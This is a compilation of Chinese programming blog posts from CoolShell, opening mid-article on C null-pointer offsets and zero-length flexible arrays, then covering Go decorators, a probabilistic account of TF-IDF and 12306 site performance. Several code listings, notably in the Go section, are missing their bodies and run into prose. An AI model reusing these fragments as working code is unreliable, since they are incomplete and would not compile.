下面我们来做个实验：编译后，我们用gdb调试一下，当初始化pt后，我们看看如下的调试：（我们可以看到就算是pt为NULL，访问其中的成员时，其实就是在访问相对于pt的内址）(gdb) p pt     $1 = (struct test *) 0x0     (gdb) p pt->i     Cannot access memory at address 0x0     (gdb) p pt->c     Cannot access memory at address 0x4     (gdb) p pt->p     Cannot access memory at address 0x8注意：上面的pt->p的偏移之所以是0x8而不是0x6，是因为内存对齐了（我在64位系统上）。关于内存对齐，可参看《深入理解C语言》一文。好了，现在你知道为什么原题中会访问到了0x4的地址了吧，因为是相对地址。相对地址有很好多处，其可以玩出一些有意思的编程技巧，比如把C搞出面向对象式的感觉来，你可以参看我正好11年前的文章《用C写面向对像的程序》（用指针类型强转的危险玩法——相对于C++来说，C++编译器帮你管了继承和虚函数表，语义也清楚了很多）
#### 指针和数组的差别有了上面的基础后，你把源代码中的struct str结构体中的char s[0];改成char *s;试试看，你会发现，在13行if条件的时候，程序因为Cannot access memory就直接挂掉了。为什么声明成char s[0]，程序会在14行挂掉，而声明成char *s，程序会在13行挂掉呢？ **那么char *s 和 char s[0]有什么差别呢** ？在说明这个事之前，有必要看一下汇编代码，用GDB查看后发现：* 对于char s[0]来说，汇编代码用了lea指令，lea 0x04(%rax), %rdx   * 对于char*s来说，汇编代码用了mov指令，mov 0x04(%rax), %rdxlea全称load effective address，是把地址放进去，而mov则是把地址里的内容放进去。所以，就crash了。从这里，我们可以看到， **访问成员数组名其实得到的是数组的相对地址，而访问成员指针其实是相对地址里的内容** （这和访问其它非指针或数组的变量是一样的）换句话说， **对于数组 char s[10]来说，数组名 s 和 &s 都是一样的**（不信你可以自己写个程序试试）。在我们这个例子中，也就是说，都表示了偏移后的地址。这样，如果我们访问 指针的地址（或是成员变量的地址），那么也就不会让程序挂掉了。
正如下面的代码，可以运行一点也不会crash掉（你汇编一下你会看到用的都是lea指令）：int main(){     struct test *pt=NULL;     printf("&s = %x\n", pt->s); //等价于 printf("%x\n", &(pt->s) );     printf("&i = %x\n", &pt->i); //因为操作符优先级，我没有写成&(pt->i)     printf("&c = %x\n", &pt->c);     printf("&p = %x\n", &pt->p);     return 0;     }**看到这里，你觉得这能算坑吗？不要出什么事都去怪语言，大家要想想是不是问题出在自己身上。**#### 关于零长度的数组首先，我们要知道， **0长度的数组在ISO C和C++的规格说明书中是不允许的** 。这也就是为什么在VC++2012下编译你会得到一个警告：“arning C4200: 使用了非标准扩展 : 结构/联合中的零大小数组”。那么为什么gcc可以通过而连一个警告都没有？那是因为gcc 为了预先支持C99的这种玩法，所以，让“零长度数组”这种玩法合法了。关于GCC对于这个事的文档在这里：“Arrays of Length Zero”，文档中给了一个例子（我改了一下，改成可以运行的了）：
struct line {     int length;     char contents[0]; // C99的玩法是：char contents[]; 没有指定数组长度     };上面这段代码的意思是：我想分配一个不定长的数组，于是我有一个结构体，其中有两个成员，一个是length，代表数组的长度，一个是contents，代码数组的内容。后面代码里的 this_length（长度是10）代表是我想分配的数据的长度。（这看上去是不是像一个C++的类？）这种玩法英文叫：Flexible Array，中文翻译叫：柔性数组。我们来用gdb看一下：(gdb) p thisline     $1 = (struct line *) 0x601010(gdb) p thisline->contents     $3 = 0x601014 "aaaaaaaaaa"我们可以看到：在输出*thisline时，我们发现其中的成员变量contents的地址居然和thisline是一样的（偏移量为0x0??!!）。但是当我们输出thisline->contents的时候，你又发现contents的地址是被offset了0x4了的，内容也变成了10个‘a’。（我觉得这是一个GDB的bug，VC++的调试器就能很好的显示）
我们继续，如果你sizeof(char[0])或是 sizeof(int[0]) 之类的零长度数组，你会发现sizeof返回了0，这就是说，零长度的数组是存在于结构体内的，但是不占结构体的size。你可以简单的理解为一个没有内容的占位标识，直到我们给结构体分配了内存，这个占位标识才变成了一个有长度的数组。看到这里，你会说，为什么要这样搞啊，把contents声明成一个指针，然后为它再分配一下内存不行么？就像下面一样。这不一样清楚吗？而且也没什么怪异难懂的东西。是的，这也是普遍的编程方式，代码是很清晰，也让人很容易理解。即然这样，那为什么要搞一个零长度的数组？有毛意义？！这个事情出来的原因是—— **我们想给一个结构体内的数据分配一个连续的内存！** 这样做的意义有两个好处：**第一个意义是，方便内存释放** 。如果我们的代码是在一个给别人用的函数中，你在里面做了二次内存分配，并把整个结构体返回给用户。用户调用free可以释放结构体，但是用户并不知道这个结构体内的成员也需要free，所以你不能指望用户来发现这个事。所以，如果我们把结构体的内存以及其成员要的内存一次性分配好了，并返回给用户一个结构体指针，用户做一次free就可以把所有的内存也给释放掉。（读到这里，你一定会觉得C++的封闭中的析构函数会让这事容易和干净很多）
**第二个原因是，这样有利于访问速度** 。连续的内存有益于提高访问速度，也有益于减少内存碎片。（其实，我个人觉得也没多高了，反正你跑不了要用做偏移量的加法来寻址）我们来看看是怎么个连续的，用gdb的x命令来查看：(我们知道，用struct line {}中的那个char contents[]不占用结构体的内存，所以，struct line就只有一个int成员，4个字节，而我们还要为contents[]分配10个字节长度，所以，一共是14个字节)(gdb) x /14b thisline     0x601010:       10      0       0       0       97      97      97      97     0x601018:       97      97      97      97      97      97从上面的内存布局我们可以看到，前4个字节是 int length，后10个字节就是char contents[]。如果用指针的话，会变成这个样子：(gdb) x /16b thisline     0x601010:       1       0       0       0       0       0       0       0     0x601018:       32      16      96      0       0       0       0       0     (gdb) x /10b this->contents     0x601020:       97      97      97      97      97      97      97      97     0x601028:       97      97
上面一共输出了四行内存，其中，* 第一行前四个字节是 int length，第一行的后四个字节是对齐。   * 第二行是char* contents，64位系统指针8个长度，他的值是0x20 0x10 0x60 也就是0x601020。   * 第三行和第四行是char* contents指向的内容。从这里，我们看到， **其中的差别——数组的原地就是内容，而指针的那里保存的是内容的地址** 。#### 后记好了，我的文章到这里就结束了。但是，请允许我再唠叨两句。**1）看过这篇文章，你觉得C复杂吗？我觉得并不简单。某些地方的复杂程度不亚于C++。****2）那些学不好C++的人一定是连C都学不好的人。连C都没学好，你们根本没有资格鄙视C++。****3）当你们在说有坑的时候，你得问一下自己，是真有坑还是自己的学习能力上出了问题。**如果你觉得你的C语言还不错，欢迎你看看《C语言的谜题》还有《谁说C语言很简单？》还有《语言的歧义》以及《深入理解C语言》一文。（全文完）# 一个浏览器市场占有量的图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
下面这个网站是一个关于Web浏览器的市场占有量的图：这个图是从2002年到2009年，也许未来还会更新，把鼠标移到每个弧上你可以看到那个浏览器的的占有量的百分比。如下图：这个图本来没有什么，但制作者把其做成了一个圆弧形，这样，看下来就有些不一样了。你还没有看出来？让我们来对比一下这个图和FireFox的logo吧。# Go编程模式：修饰器作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn之前写过一篇《Python修饰器的函数式编程》，这种模式很容易的可以把一些函数装配到另外一些函数上，可以让你的代码更为的简单，也可以让一些“小功能型”的代码复用性更高，让代码中的函数可以像乐高玩具那样自由地拼装。所以，一直以来，我对修饰器decoration这种编程模式情有独钟，这里写一篇Go语言相关的文章。### 本文是全系列中第7 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程
« 上一篇文章下一篇文章 »看过Python修饰器那篇文章的同学，一定知道这是一种函数式编程的玩法——用一个高阶函数来包装一下。多唠叨一句，关于函数式编程，可以参看我之前写过一篇文章《函数式编程》，这篇文章主要是，想通过从过程式编程的思维方式过渡到函数式编程的思维方式，从而带动更多的人玩函数式编程，所以，如果你想了解一下函数式编程，那么可以移步先阅读一下。所以，Go语言的修饰器编程模式，其实也就是函数式编程的模式。不过，要提醒注意的是，Go 语言的“糖”不多，而且又是强类型的静态无虚拟机的语言，所以，无法做到像 Java 和 Python 那样的优雅的修饰器的代码。当然，也许是我才才疏学浅，如果你知道有更多的写法，请你一定告诉我。先谢过了。目录* 简单示例   * HTTP 相关的一个示例   * 多个修饰器的 Pipeline   * 泛型的修饰器#### 简单示例我们先来看一个示例：package mainimport "fmt"我们可以看到，我们动用了一个高阶函数 `decorator()`，在调用的时候，先把 `Hello()` 函数传进去，然后其返回一个匿名函数，这个匿名函数中除了运行了自己的代码，也调用了被传入的 `Hello()` 函数。
这个玩法和 Python 的异曲同工，只不过，有些遗憾的是，Go 并不支持像 Python 那样的 `@decorator` 语法糖。所以，在调用上有些难看。当然，如果你要想让代码容易读一些，你可以这样：hello := decorator(Hello)     hello("Hello")我们再来看一个和计算运行时间的例子：package mainimport (     "fmt"     "reflect"     "runtime"     "time"     )type SumFunc func(int64, int64) int64return f(start, end)     }     }sum1 := timedSumFunc(Sum1)     sum2 := timedSumFunc(Sum2)fmt.Printf("%d, %d\n", sum1(-10000, 10000000), sum2(-10000, 10000000))     }关于上面的代码，有几个事说明一下：1）有两个 Sum 函数，`Sum1()` 函数就是简单的做个循环，`Sum2()` 函数动用了数据公式。（注意：start 和 end 有可能有负数的情况）
2）代码中使用了 Go 语言的反射机器来获取函数名。3）修饰器函数是 `timedSumFunc()`运行后输出：$ go run time.sum.go     --- Time Elapsed (main.Sum1): 3.557469ms ---     --- Time Elapsed (main.Sum2): 291ns ---     49999954995000, 49999954995000#### HTTP 相关的一个示例我们再来看一个处理 HTTP 请求的相关的例子。先看一个简单的 HTTP Server 的代码。package mainimport (     "fmt"     "log"     "net/http"     "strings"     )上面代码中使用到了修饰模式，`WithServerHeader()` 函数就是一个 Decorator，其传入一个 `http.HandlerFunc`，然后返回一个改写的版本。上面的例子还是比较简单，用 `WithServerHeader()` 就可以加入一个 Response 的 Header。于是，这样的函数我们可以写出好些个。如下所示，有写 HTTP 响应头的，有写认证 Cookie 的，有检查认证Cookie的，有打日志的……
package mainimport (     "fmt"     "log"     "net/http"     "strings"     )#### 多个修饰器的 Pipeline在使用上，需要对函数一层层的套起来，看上去好像不是很好看，如果需要 decorator 比较多的话，代码会比较难看了。嗯，我们可以重构一下。重构时，我们需要先写一个工具函数——用来遍历并调用各个 decorator：type HttpHandlerDecorator func(http.HandlerFunc) http.HandlerFunc然后，我们就可以像下面这样使用了。http.HandleFunc("/v4/hello", Handler(hello,     WithServerHeader, WithBasicAuth, WithDebugLog))这样的代码是不是更易读了一些？pipeline 的功能也就出来了。#### 泛型的修饰器不过，对于 Go 的修饰器模式，还有一个小问题 —— 好像无法做到泛型，就像上面那个计算时间的函数一样，其代码耦合了需要被修饰的函数的接口类型，无法做到非常通用，如果这个事解决不了，那么，这个修饰器模式还是有点不好用的。
因为 Go 语言不像 Python 和 Java，Python是动态语言，而 Java 有语言虚拟机，所以他们可以干好些比较变态的事，然而 Go 语言是一个静态的语言，这意味着其类型需要在编译时就要搞定，否则无法编译。不过，Go 语言支持的最大的泛型是 `interface{}` 还有比较简单的 reflection 机制，在上面做做文章，应该还是可以搞定的。废话不说，下面是我用 reflection 机制写的一个比较通用的修饰器（为了便于阅读，我删除了出错判断代码）decoratedFunc = reflect.ValueOf(decoPtr).Elem()     targetFunc = reflect.ValueOf(fn)decoratedFunc.Set(v)     return     }上面的代码动用了 `reflect.MakeFunc()` 函数制出了一个新的函数其中的 `targetFunc.Call(in)` 调用了被修饰的函数。关于 Go 语言的反射机制，推荐官方文章 —— 《The Laws of Reflection》，在这里我不多说了。上面这个 `Decorator()` 需要两个参数，
* 第一个是出参 `decoPtr` ，就是完成修饰后的函数   * 第二个是入参 `fn` ，就是需要修饰的函数这样写是不是有些二？的确是的。不过，这是我个人在 Go 语言里所能写出来的最好的的代码了。如果你知道更多优雅的，请你一定告诉我！好的，让我们来看一下使用效果。首先假设我们有两个需要修饰的函数：然后，我们可以这样做：type MyFoo func(int, int, int) int     var myfoo MyFoo     Decorator(&myfoo, foo)     myfoo(1, 2, 3)你会发现，使用 `Decorator()` 时，还需要先声明一个函数签名，感觉好傻啊。一点都不泛型，不是吗？嗯。如果你不想声明函数签名，那么你也可以这样mybar := bar     Decorator(&mybar, bar)     mybar("hello,", "world!")好吧，看上去不是那么的漂亮，但是 it works。看样子 Go 语言目前本身的特性无法做成像 Java 或 Python 那样，对此，我们只能多求 Go 语言多放糖了！Again， 如果你有更好的写法，请你一定要告诉我。
（全文完）# TF-IDF模型的概率解释作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢**@猫叔shiro **（以前的todd） 投递此文）**目录* 信息检索概述   * tf-idf模型   * 信息检索问题的概率视角   * 盒子小球模型   * 文档先验概率P(d)与PageRank   * 词的先验概率P(w)   * 词代表文档主题的条件概率P(w | d)   * 词的信息量和idf   * 多关键词   * 总结#### 信息检索概述信息检索是当前应用十分广泛的一种技术，论文检索、搜索引擎都属于信息检索的范畴。通常，人们把信息检索问题抽象为：在文档集合D上，对于由关键词w[1] … w[k]组成的查询串q，返回一个按查询q和文档d匹配度relevance(q, d)排序的相关文档列表D’。对于这一问题，先后出现了布尔模型、向量模型等各种经典的信息检索模型，它们从不同的角度提出了自己的一套解决方案。布尔模型以集合的布尔运算为基础，查询效率高，但模型过于简单，无法有效地对不同文档进行排序，查询效果不佳。向量模型把文档和查询串都视为词所构成的多维向量，而文档与查询的相关性即对应于向量间的夹角。不过，由于通常词的数量巨大，向量维度非常高，而大量的维度都是0，计算向量夹角的效果并不好。另外，庞大的计算量也使得向量模型几乎不具有在互联网搜索引擎这样海量数据集上实施的可行性。
#### tf-idf模型目前，真正在搜索引擎等实际应用中广泛使用的是tf-idf模型。tf- idf模型的主要思想是：如果词w在一篇文档d中出现的频率高，并且在其他文档中很少出现，则认为词w具有很好的区分能力，适合用来把文章d和其他文章区分开来。该模型主要包含了两个因素：1) 词w在文档d中的词频tf (Term Frequency)，即词w在文档d中出现次数count(w, d)和文档d中总词数size(d)的比值：tf(w,d) = count(w, d) / size(d)2) 词w在整个文档集合中的逆向文档频率idf (Inverse Document Frequency)，即文档总数n与词w所出现文件数docs(w, D)比值的对数:idf = log(n / docs(w, D))tf-idf模型根据tf和idf为每一个文档d和由关键词w[1]…w[k]组成的查询串q计算一个权值，用于表示查询串q与文档d的匹配度：#### 信息检索问题的概率视角直观上看，tf描述的是文档中词出现的频率；而idf是和词出现文档数相关的权重。我们比较容易定性地理解tf-idf的基本思想，但具体到tf- idf的一些细节却并不是那么容易说清楚为什么。比如：
1) 为什么tf是count(w, d) / size(d)？能不能是log(count(w, d) / size(d))等其他形式？2) 为什么idf是一个log形式？3) 为什么tf和idf之间是乘积关系，而不是加法或指数关系？4) 为什么多个关键词的tf-idf值是加法关系，而不是乘法或者指数关系？5) 除了tf-idf值，Google还会计算网页的PageRank值，二者相乘得到最后的权值，为什么是乘法，而不是加法或指数？据说，最初甚至tf- idf的提出者自己也没有对诸如“为什么idf是log形式”这个问题给出有力的解释，虽然后来有人从信息论的角度对idf的log形式给出了令人信服的解释，但是剩下的其他一些疑问仍然存在。在我了解的范围内，对于tf- idf模型还没有一个真正统一完整的理论解释。在试图为tf-idf找到更好的理论解释的过程中，我意识到对tf-idf模型种种疑问的根源在于tf- idf试图表达的“查询q和文档的匹配度”本身就有一定的模糊性，什么叫做“匹配度”，这就有很大的自由发挥空间。如果说向量模型的用向量夹角来表示匹配度概念还有一定的理论基础，那么用tf- idf来表达匹配度就有点“与其说是科学，不如说是艺术”的味道。
更进一步，其实，信息检索问题的抽象方式“在文档集合D上，对于给定查询串q，返回一个按查询q和文档d匹配度relevance(q, d)排序的相关文档列表D’”本身是值得反思的。我们应当考虑抛弃“匹配度”这种模糊的目标，从根源上寻求一种具有明确数学意义的目标。如果我们从概率视角来看， **把“查询串q和文档d的匹配度”问题转换为“当查询串是q时，用户期望获得文档d的概率”问题** ，信息检索问题就清晰多了。一方面这个概率描述是站在人的角度来看待信息检索问题的，更加贴近实际的用户体验；另一方面，概率本身是有明确数学意义的，这样我们就首先从目标上对问题进行了严格化。下面，我将通过一个模型，从概率的视角，一边解释tf-idf的概率意义，一边指出其不合理之处。#### 盒子小球模型为了分析“当查询串是q时，用户期望获得文档d的概率”问题，我首先建立了一种称为“盒子小球模型”的简化模型。盒子小球模型把词想象成各种不同颜色的小球，文档想象成装有若干小球的盒子，把“当查询串是q时，用户期望获得文档d的概率“转换为下面的问题：**有n个盒子d[1], d[2], … d[n]，每个盒子中有若干不同颜色的小球，有人随机地选择了一个盒子，并从盒子中随机地拿出了一个颜色为w[j]的小球，那么这个小球来自于盒子d[i]的概率是多少？**
其实，这就是经典的条件概率问题P(d[i] | w[j])，采用贝叶斯推断将其转化为：P(d[i] | w[j])     = P(d[i], w[j]) / P(w[j])     = P(d[i]) * P(w[j] | d[i]) / P(w[j])我们注意到这个条件概率包括几个部分，P(d[i])是盒子d[i]被选中的先验概率，p(w[j])是w[j]颜色小球被选中的先验概率，P(w[j] | d[i])是在盒子d[i]中选中颜色w[j]小球的条件概率。#### 文档先验概率P(d)与PageRank首先，我们来看盒子d[i]被选中的先验概率P(d[i])是什么。P(d[i])的意义是：当用户什么也没有输入的时候，它可能对文档d[i]感兴趣的概率。在没有更多信息的情况下，我们可以认为每个盒子被选中的先验概率P(d[i])是相等的，都等于1 / m，其中m表示总文档数（总盒子数），这时P(d[i])作为公共系数可被忽略。不过，在实际应用中，我们通常可以根据其他知识获得各文档的先验概率，比如，学术文献和网页通常可以基于引用度模型计算其先验概率，这些经典论文和热门网页是多数人乐于见到的。说到这里，你可能已经发现，Google PageRank本质上就是这个先验概率P(d[i])乘以某个系数！所以，PageRank实际上也被纳入这个条件概率模型中来了，这就不难解释为什么在Google的排序算法中PageRank权重和tf- idf权重是一种乘积关系而不是加或者指数关系。另一方面，在理解了文档先验概率对整个搜索结果概率的影响后，当搜索引擎中针对PageRank出现各种假链接SEO时，我们可以不拘泥于基于链接引用模型的PageRank，只要是以网页先验概率为目标，不论是采用基于链接引用的PageRank，还是基于搜索结果点击数模型，或是其他模型，都是可以的。这就是“变通”，从原理上“通”了，就可以在方法上“变”。
#### 词的先验概率P(w)下面我们来考察词w[j]的先验概率P(w[j])。P(w[j])的意义是：在整个文档集合中，w[j]被作为搜索关键词的概率，比如：“iPhone 5”，“青花瓷”这类词被用作搜索关键词的概率较高，而“的”，“什么”，“我们”这类高频词不大可能成为搜索关键词。那么，我们如何来定量计算P(w[j])呢？一种思路就是把w[j]在文档集中出现的频率作为其先验概率。不过，显然存在更好的方案：在大量的搜索查询中进行统计，统计方法得出P(w[j])的方法很接近P(w[j])本质的，不需要引入额外的假设。比如，一段时间内某搜索引擎的搜索总次数为10^10次，“公积金”这个词出现了100次，那么，我们可以认为先验概率P(“公积金”)就是100 / 10^10 = 10^-8。#### 词代表文档主题的条件概率P(w | d)最后，我们来看条件概率P(w[j] | d[i])。P(w[j] | d[i])的意义是在文档d[i]中，人们用关键词w[j]来搜索它的概率。那么，什么样的词是人们会用来搜索一篇文档的呢？多数情况下，是那些代表一篇文档主题的词。比如，有一篇新闻是关于iPhone 5发布会的，那么“iPhone5”， “发布会”，“库克”，“苹果”这些词基本上就构成了文章的主题；那么，反过来说，如果用户想搜索这篇关于iPhone 5发布会的新闻，他就有很大的可能通过这几个词来进行搜索。我们应当注意分辨P(w[j] | d[i])与P(w[j])的区别，后者可以通过大量的查询统计得来，而前者不能与后者直接划等号，因为前者的意义是w[j]代表d[i]主题的概率。如果非要引入统计方法，那么P(w[j] | d[i])对应的统计是：当搜索关键词是w[j]且搜索结果包含d[i]时，用户点击（满意）d[i]作为搜索结果的频率。比如，用“iPhone5 发布会”的搜索，在结果中有都10000次出现了网页x，其中，用户8000次点击了网页x，那么，可以认为有80%的概率网页x的主题是关于“iPhone5 发布会”的。
#### 词的信息量和idf上面谈到了对P(w[j] | d[i])的计算的统计方法，但该方法有一定的局限，比如，要能进行统计首先需要文档出现在足够多的搜索结果中，需要时间和量的积累。除了统计方法外，我们可以考虑其他方法计算词w[j]代表文档d[i]主题的概率。可能有人立刻会想到要对文章进行语义分析提取关键词，给这些关键词高权重，给其他词低权重。这种想法有一定的合理性，但实现上涉及语义分析，没有成熟高效的方法。实际上，信息论为我们提供了另一条高效方案。上面谈到“的”，“什么”，“我们”这类高频词不会成为文档主题和搜索关键词的原因是它们不能提供足够的信息，而“iPhone 5”，“发布会”这样的词汇则信息量丰富。所谓信息是指对不确定性（熵）的减小程度，信息的单位是比特(bit)，信息量越大对于不确定性的减小程度越大。比如，外面可能在下雨也可能没有下雨，可能性空间大小为2，如果我们看一眼窗外，可能性空间就变成了1，那么“看见窗外在下雨”所提供的信息量就和熵的减小程度成正比，具体来讲等于log(2/1)=1。如果要用二进制编码是否下雨，需要1个bit，0代表没有下雨，1代表下雨。但在很多场景下，各个可能性的概率并不相同，比如：欧洲杯16只球队都可能夺冠，赛前它们夺冠的先验概率并不相同，那么结果的不确定性程度实际上是小于log(16)=4。如果你没有看比赛，有人告诉你西班牙夺冠了，你可能会觉得很正常，但如果有人告诉你瑞士夺冠了，你通常会非常惊讶。这一现象的理论解释是，如果赛前西班牙夺冠概率是1/4，而瑞士夺冠概率是1/32，那么，“西班牙夺冠”的信息量为log(4)=2，即把不确定性减小为原来的1/4，而“瑞士夺冠”的信息量为log(32)=5，不确定性减小为原来的1/32，一下子接受比前者大了两倍以上的信息量，当然你会吃惊。
回到信息检索，比如，“2012美国大选”这个查询串包含了“2012”，“美国”和“大选”3个关键词，我们应该如何定量计算它们的信息量呢？根据信息的定义，词的信息量等于它对不确定性的缩小程度。如果文档总数为2^30，其中2^14篇文档出现了“美国”，那么“美国”这个词就把文档的不确定性从2^30缩小为2^14，它所包含的信息量为log(2^30/2^14)=16；而只有2^10篇文档出现了“大选”，那么大选的信息量就是log(2^30/2^10)=20，比“美国”多了4个bit。而“的”，“什么”，“我们”这些高频词对减小文档不确定性几乎没有帮助，因而信息量为0。相信你已经发现，上面idf(w)公式中的log(n / docs(w, D))实际上就是词w的信息量了。如果我们考虑词的信息量对条件概率P(w[j] | d[i])的影响，假设“词w在文档中被选中的概率与其在文档中的出现频率和其信息量的乘积成正比”，那么上面的条件概率模型就变成：我们看到tf-idf已经被纳入框架内了，但是还多出文档先验概率P(d[i])，关键词先验概率P(w[j])和文档各词的总tf- idf(d[i])。普通搜索引擎是基于PageRank和tf-idf的，那么，根据这个概率模型，我们可以看出，它没有考虑文档总tf- idf(d[i])和关键词先验概率p(w[j])。如果考虑这两个因素，相信搜索效果会更好。
#### 多关键词上面的条件概率模型主要是针对单个关键词的情况，下面我们进一步将其扩展到多关键词情况。我们知道，在tf-idf中，多个关键词的所产生的tf- idf值是一种叠加关系，那么这是否符合条件概率模型呢？答案是否定的。在两个关键字情况下，条件概率问题转化为“如果有人从一个盒子中同时摸出颜色w[x]的小球和颜色w[y]的小球，这两个小球来自于盒子d[i]的概率是多少？”。假设从盒子中摸出各个小球事件是相互独立的情况下，即P(w[x], w[y])     = P(w[x]) * P(w[y]) P(w[x], w[y] | d[i])     = P(w[x] | d[i]) * P(w[y] | d[i])我们可以推导出条件概率：P(d[i] | w[x], w[y])     = P(d[i], w[x], w[y]) / P(w[x], w[y])     = P(d[i]) * P(w[x], w[y] | d[i]) / P(w[x], w[y])     = P(d[i]) * P(w[x] | d[i]) * P(w[y] | d[i]) / (P(w[x] * P(w[y]))     = P(d[i]) * (tf-idf(w[x], d[i]) / tf-idf(d[i])) * ((tf-idf(w[y], d[i]) / tf-idf(d[i]))) / (p(w[x]) * P(w[y]))
可见，概率模型所得出的各个关键词的tf-idf值之间是乘积关系，这是与tf- idf模型的加法关系是不同的。这一点可能与二者是否要求“文档必须包含所有查询关键词”的基本假设有关系。在文档不包含所有关键字的这种情况下，tf- idf模型可能得出一个非0的匹配度，但条件概率模型得出的概率肯定为0。不过，如果考虑一般查询关键词数量不多（3个以内），而大量文档都同时包含这些关键词，概率模型的乘积关系是比tf- idf模型的加法关系更有理论基础。从根本上讲，这是因为tf-idf的“匹配度”是一个模棱两可的概念，而条件概率有坚实的理论基础。#### 总结TF-IDF模型是搜索引擎中广泛使用的信息检索模型，但对于TF- IDF模型一直存在各种疑问。本文为信息检索问题一种基于条件概率的盒子小球模型，其核心思想是把“查询串q和文档d的匹配度问题”转化为“查询串q来自于文档d的条件概率问题”。它从概率的视角为信息检索问题定义了比TF- IDF模型所表达的匹配度更为清晰的目标。从概率模型中，我们看到查询串q来自于文档d的条件概率主要包含以下几个因素：1) 文档的先验概率P(d[i])，这与PageRank对应；2) 词w被作为搜索关键词的先验概率P(w)，这可以通过统计方法获得；3) 关键词w代表文档d主题，或以词w搜索文档d的概率，P(w | d)，除了统计方法，这可以通过tf-idf来计算。
# 由12306.cn谈谈网站性能技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn12306.cn网站挂了，被全国人民骂了。我这两天也在思考这个事，我想以这个事来粗略地和大家讨论一下网站性能的问题。因为仓促，而且完全基于本人有限的经验和了解，所以，如果有什么问题还请大家一起讨论和指正。（这又是一篇长文，只讨论性能问题，不讨论那些UI，用户体验，或是是否把支付和购票下单环节分开的功能性的东西）目录* 业务   * 前端性能优化技术     * 一、前端负载均衡     * 二、减少前端链接数     * 三、减少网页大小增加带宽     * 四、前端页面静态化     * 五、优化查询     * 六、缓存的问题   * 后端性能优化技术     * 一、数据冗余     * 二、数据镜像     * 三、数据分区     * 四、后端系统负载均衡     * 五、异步、 throttle 和 批量处理   * 小结#### 业务任何技术都离不开业务需求，所以，要说明性能问题，首先还是想先说说业务问题。* **其一** ， **有人可能把这个东西和QQ或是网游相比** 。但我觉得这两者是不一样的，网游和QQ在线或是登录时访问的更多的是用户自己的数据，而订票系统访问的是中心的票量数据，这是不一样的。不要觉得网游或是QQ能行你就以为这是一样的。网游和QQ 的后端负载相对于电子商务的系统还是简单。
* **其二** ， **有人说春节期间订火车的这个事好像网站的秒杀活动** 。的确很相似，但是如果你的思考不在表面的话，你会发现这也有些不一样。火车票这个事，一方面会伴随着大量的查询操作，更BT的是下单的时候需要对数据库很多的一致性的操作，一方面是从起点到终点各个分段票的一致性，另一方面，买的人路线、车次、时间选择有很多，会不停地改变下单方式。而秒杀，直接杀就好了，没有那么多查询和一致性的问题。另外，关于秒杀，完全可以做成只接受前N个用户的请求（完全不操作后端的任何数据， 仅仅只是对用户的下单操作log），这种业务，只需要在内存cache中放好可秒杀的数量，还可以把数据分布开来放，100商品，10台服务器一台放10个，无需在当时操作任何数据库。可以订单数够后，停止秒杀，然后批量写数据库。而且秒杀的商品不多。火车票这个不是像秒杀那么简单的，春运时间，几乎所有的票都是热门票，而且几乎是全国人民都来了，而且还有转车业务，多条线的库存都要做事务操作，你想想吧，这有多难。（淘宝的双十一也就3百万用户，而火车票瞬时有千万级别甚至是亿级别的）（ **更新：2014年1月11日** ：来了淘宝后，对淘宝的系统有了解，淘宝的秒杀活动，本质上是用输验证码并在CDN上把用户直接过滤掉了，比如：1千万个用户过滤了只剩2万个用户，这样数据库就顶得住了）
* **其三** ， **有人拿这个系统和奥运会的票务系统比较** 。我觉得还是不一样。虽然奥运会的票务系统当年也一上线就废了。但是奥运会用的是抽奖的方式，也就是说不存在先来先得的抢的方式，而且，是事后抽奖，事前只需要收信息，事前不需要保证数据一致性，没有锁，很容易水平扩展。* **其四** ， **订票系统应该和电子商务的订单系统很相似** ，都是需要对库存进行：1）占住库存，2）支付（可选），3）扣除库存的操作。这个是需要有一致性的检查的，也就是在并发时需要对数据加锁的。B2C的电商基本上都会把这个事干成异步的，也就是说，你下的订单并不是马上处理的，而是延时处理的，只有成功处理了，系统才会给你一封确认邮件说是订单成功。我相信有很多朋友都收到认单不成功的邮件。 **这就是说，数据一致性在并发下是一个瓶颈** 。* **其五** ， **铁路的票务业务很变态** ，其采用的是突然放票，而有的票又远远不够大家分，所以，大家才会有抢票这种有中国特色的业务的做法。于是当票放出来的时候，就会有几百万人甚至上千万人杀上去，查询，下单。几十分钟内，一个网站能接受几千万的访问量，这个是很恐怖的事情。据说12306的高峰访问是10亿PV，集中在早8点到10点，每秒PV在高峰时上千万。
多说几句：* **库存是B2C的恶梦，库存管理相当的复杂** 。不信，你可以问问所有传统和电务零售业的企业，看看他们管理库存是多么难的一件事。不然，就不会有那么多人在问凡客的库存问题了。（你还可以看看《乔布斯传》，你就知道为什么Tim会接任Apple的CEO了，最主要的原因是他搞定了苹果的库存周期问题）* **对于一个网站来说，浏览网页的高负载很容易搞定，查询的负载有一定的难度去处理，不过还是可以通过缓存查询结果来搞定，最难的就是下单的负载** 。因为要访问库存啊，对于下单，基本上是用异步来搞定的。去年双11节，淘宝的每小时的订单数大约在60万左右，京东一天也才能支持40万（居然比12306还差），亚马逊5年前一小时可支持70万订单量。可见，下订单的操作并没有我们相像的那么性能高。* **淘宝要比B2C的网站要简单得多，因为没有仓库** ，所以，不存在像B2C这样有N个仓库对同一商品库存更新和查询的操作。下单的时候，B2C的 网站要去找一个仓库，又要离用户近，又要有库存，这需要很多计算。试想，你在北京买了一本书，北京的仓库没货了，就要从周边的仓库调，那就要去看看沈阳或 是西安的仓库有没有货，如果没有，又得看看江苏的仓库，等等。淘宝的就没有那么多事了，每个商户有自己的库存，库存就是一个数字，并且库存分到商户头上了，反而有利于性能扩展。
